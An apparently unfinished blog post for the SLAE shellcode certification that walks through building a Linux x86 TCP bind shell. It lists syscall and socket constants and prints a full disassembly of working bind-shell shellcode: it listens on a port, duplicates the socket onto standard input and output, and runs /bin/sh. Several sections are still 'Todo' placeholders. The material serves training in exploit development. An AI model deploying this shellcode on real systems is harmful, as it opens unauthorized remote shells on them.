# SLAE Assignment #1

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Resources

* https://packetstormsecurity.com/files/11058/bindshell.c.html

## Assignment

Create a Shell_Bind_TCP shellcode

* Binds to a port
* Execute shell on incoming connections
* Port number should be easily configurable

## C prototype code:

To better understand how the tcp bind shellcode works, the following C implementation has been created (comments are in the code):

```c
Todo: put c code
```

## Assembler Code:

In order to create an analogue asm shellcode it's first necessary to retrieve some information related to syscalls from unistd_32.h as follows:

Function: socketcall

vagrant@precise32:/$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall		102
vagrant@precise32:/$ 

all the sockets function are just determined by the value in Eax, to get the required values:

vagrant@precise32:/$ grep SYS_ /usr/include/linux/net.h
#define SYS_SOCKET	1		/* sys_socket(2)		*/ <-------------- Interesting for us
#define SYS_BIND	2		/* sys_bind(2)			*/ <-------------- Interesting for us
#define SYS_CONNECT	3		/* sys_connect(2)		*/ 
#define SYS_LISTEN	4		/* sys_listen(2)		*/ <-------------- Interesting for us
#define SYS_ACCEPT	5		/* sys_accept(2)		*/ <-------------- Interesting for us
#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)		*/
#define SYS_GETPEERNAME	7		/* sys_getpeername(2)		*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
#define SYS_SEND	9		/* sys_send(2)			*/
#define SYS_RECV	10		/* sys_recv(2)			*/
#define SYS_SENDTO	11		/* sys_sendto(2)		*/
#define SYS_RECVFROM	12		/* sys_recvfrom(2)		*/
#define SYS_SHUTDOWN	13		/* sys_shutdown(2)		*/
#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)		*/
#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)		*/
#define SYS_SENDMSG	16		/* sys_sendmsg(2)		*/
#define SYS_RECVMSG	17		/* sys_recvmsg(2)		*/
#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)		*/
#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)		*/
vagrant@precise32:/$ 

socket costants:

vagrant@precise32:~$ cat /usr/include/netinet/in.h

vagrant@precise32:~$ cat /usr/include/netinet/in.h | grep IPPROTO_TCP
    IPPROTO_TCP = 6,	   /* Transmission Control Protocol.  */
#define IPPROTO_TCP		IPPROTO_TCP
vagrant@precise32:~$ 

include/linux/socket.h

/* Socket types. */
#define SOCK_STREAM	1		/* stream (connection) socket	*/ <-------------- Interesting for us
#define SOCK_DGRAM	2		/* datagram (conn.less) socket	*/
#define SOCK_RAW	3		/* raw socket			*/
#define SOCK_RDM	4		/* reliably-delivered message	*/
#define SOCK_SEQPACKET	5		/* sequential packet socket	*/
#define SOCK_PACKET	10		/* linux specific way of	*/
					/* getting packets at the dev	*/
					/* level.  For writing rarp and	*/
					/* other similar things on the	*/
					/* user level.			*/

/* Supported address families. */
#define AF_UNSPEC	0
#define AF_UNIX		1	/* Unix domain sockets 		*/
#define AF_INET		2	/* Internet IP Protocol 	*/ <-------------- Interesting for us
#define AF_AX25		3	/* Amateur Radio AX.25 		*/
#define AF_IPX		4	/* Novell IPX 			*/
#define AF_APPLETALK	5	/* Appletalk DDP 		*/
#define	AF_NETROM	6	/* Amateur radio NetROM 	*/
#define AF_BRIDGE	7	/* Multiprotocol bridge 	*/
#define AF_AAL5		8	/* Reserved for Werner's ATM 	*/
#define AF_X25		9	/* Reserved for X.25 project 	*/
#define AF_INET6	10	/* IP version 6			*/
#define AF_MAX		12	/* For now.. */

Function: dup2

vagrant@precise32:/$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2      
#define __NR_dup2		 63
vagrant@precise32:/$ 

Function execl

vagrant@precise32:/$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep exec
#define __NR_execve		 11 <-------------- Check execl
#define __NR_kexec_load		283
vagrant@precise32:/$ 

Function: fork

vagrant@precise32:/$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep fork 
#define __NR_fork		  2
#define __NR_vfork		190
vagrant@precise32:/$ 

Function: signal

vagrant@precise32:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep signal 
#define __NR_signal		 48 <-------------- Interesting for us
#define __NR_signalfd		321
#define __NR_signalfd4		327
vagrant@precise32:~$

vagrant@precise32:~$ cat /usr/include/asm-generic/signal.h
#ifndef __ASM_GENERIC_SIGNAL_H
#define __ASM_GENERIC_SIGNAL_H

#include <linux/types.h>

#define _NSIG		64
#define _NSIG_BPW	__BITS_PER_LONG
#define _NSIG_WORDS	(_NSIG / _NSIG_BPW)

#define SIGHUP		 1 <-------------- Interesting for us
#define SIGINT		 2
#define SIGQUIT		 3
#define SIGILL		 4
#define SIGTRAP		 5
#define SIGABRT		 6
#define SIGIOT		 6
#define SIGBUS		 7
#define SIGFPE		 8
#define SIGKILL		 9
#define SIGUSR1		10
#define SIGSEGV		11
#define SIGUSR2		12
#define SIGPIPE		13
#define SIGALRM		14
#define SIGTERM		15
#define SIGSTKFLT	16
#define SIGCHLD		17
#define SIGCONT		18
#define SIGSTOP		19
#define SIGTSTP		20
#define SIGTTIN		21
#define SIGTTOU		22
#define SIGURG		23
#define SIGXCPU		24
#define SIGXFSZ		25
#define SIGVTALRM	26
#define SIGPROF		27
#define SIGWINCH	28
#define SIGIO		29
#define SIGPOLL		SIGIO
/*



```asm
Todo: ShellBind32.nasm
```

## Check for null bytes

The shellcode has some issues since many null bytes are present, the code must be reworked in order to be null bytes free

```shell
vagrant@precise32:/slae_code/Assignment 1$ ./compile.sh ShellBindTcp
######### NASM #########
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
######### GCC #########
[+] Assembling with Gcc ... 

*** Checking for null terminators

ShellBindTcp:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	b8 66 00 00 00       	mov    eax,0x66 <-------------- Null Bytes
 8048085:	bb 01 00 00 00       	mov    ebx,0x1 <-------------- Null Bytes
 804808a:	6a 06                	push   0x6
 804808c:	6a 01                	push   0x1
 804808e:	6a 02                	push   0x2
 8048090:	89 e1                	mov    ecx,esp
 8048092:	cd 80                	int    0x80
 8048094:	89 c7                	mov    edi,eax
 8048096:	b8 66 00 00 00       	mov    eax,0x66 <-------------- Null Bytes
 804809b:	bb 02 00 00 00       	mov    ebx,0x2 <-------------- Null Bytes
 80480a0:	6a 00                	push   0x0 <-------------- Null Bytes
 80480a2:	66 68 05 0d          	pushw  0xd05
 80480a6:	66 6a 02             	pushw  0x2
 80480a9:	89 e1                	mov    ecx,esp
 80480ab:	6a 10                	push   0x10
 80480ad:	51                   	push   ecx
 80480ae:	57                   	push   edi
 80480af:	89 e1                	mov    ecx,esp
 80480b1:	cd 80                	int    0x80
 80480b3:	b8 66 00 00 00       	mov    eax,0x66 <-------------- Null Bytes
 80480b8:	bb 04 00 00 00       	mov    ebx,0x4 <-------------- Null Bytes
 80480bd:	6a 05                	push   0x5
 80480bf:	57                   	push   edi
 80480c0:	89 e1                	mov    ecx,esp
 80480c2:	cd 80                	int    0x80

080480c4 <accept_handler>:
 80480c4:	b8 66 00 00 00       	mov    eax,0x66 <-------------- Null Bytes
 80480c9:	bb 05 00 00 00       	mov    ebx,0x5 <-------------- Null Bytes
 80480ce:	6a 00                	push   0x0 <-------------- Null Bytes
 80480d0:	6a 00                	push   0x0 <-------------- Null Bytes
 80480d2:	57                   	push   edi
 80480d3:	89 e1                	mov    ecx,esp
 80480d5:	cd 80                	int    0x80
 80480d7:	89 c6                	mov    esi,eax
 80480d9:	b8 02 00 00 00       	mov    eax,0x2 <-------------- Null Bytes
 80480de:	cd 80                	int    0x80
 80480e0:	09 c0                	or     eax,eax
 80480e2:	75 4e                	jne    8048132 <parent_or_error>
 80480e4:	b8 06 00 00 00       	mov    eax,0x6 <-------------- Null Bytes
 80480e9:	89 fb                	mov    ebx,edi
 80480eb:	cd 80                	int    0x80
 80480ed:	b8 3f 00 00 00       	mov    eax,0x3f <-------------- Null Bytes
 80480f2:	89 f3                	mov    ebx,esi
 80480f4:	b9 00 00 00 00       	mov    ecx,0x0 <-------------- Null Bytes
 80480f9:	cd 80                	int    0x80
 80480fb:	b8 3f 00 00 00       	mov    eax,0x3f <-------------- Null Bytes
 8048100:	b9 01 00 00 00       	mov    ecx,0x1 <-------------- Null Bytes
 8048105:	cd 80                	int    0x80
 8048107:	b8 3f 00 00 00       	mov    eax,0x3f <-------------- Null Bytes
 804810c:	b9 02 00 00 00       	mov    ecx,0x2 <-------------- Null Bytes
 8048111:	cd 80                	int    0x80
 8048113:	b8 0b 00 00 00       	mov    eax,0xb <-------------- Null Bytes
 8048118:	6a 00                	push   0x0 <-------------- Null Bytes
 804811a:	68 2f 2f 73 68       	push   0x68732f2f
 804811f:	68 2f 62 69 6e       	push   0x6e69622f
 8048124:	89 e3                	mov    ebx,esp
 8048126:	b9 00 00 00 00       	mov    ecx,0x0 <-------------- Null Bytes
 804812b:	ba 00 00 00 00       	mov    edx,0x0 <-------------- Null Bytes
 8048130:	cd 80                	int    0x80

08048132 <parent_or_error>:
 8048132:	b8 06 00 00 00       	mov    eax,0x6 <-------------- Null Bytes
 8048137:	89 f3                	mov    ebx,esi
 8048139:	cd 80                	int    0x80
 804813b:	eb 87                	jmp    80480c4 <accept_handler>
vagrant@precise32:/slae_code/Assignment 1$ 
```

null free shellcode:

```asm
Todo: ShellBind32NullFree.nasm
```

```shell
Todo: compile.sh ShellBind32NullFree
```
## Script for shellcode Customization:

The following shell script allows easy shellcode customization

```shell
Todo: CustomizeShellcode.go
```

## Final wrapped shellcode:

## Proof of execution
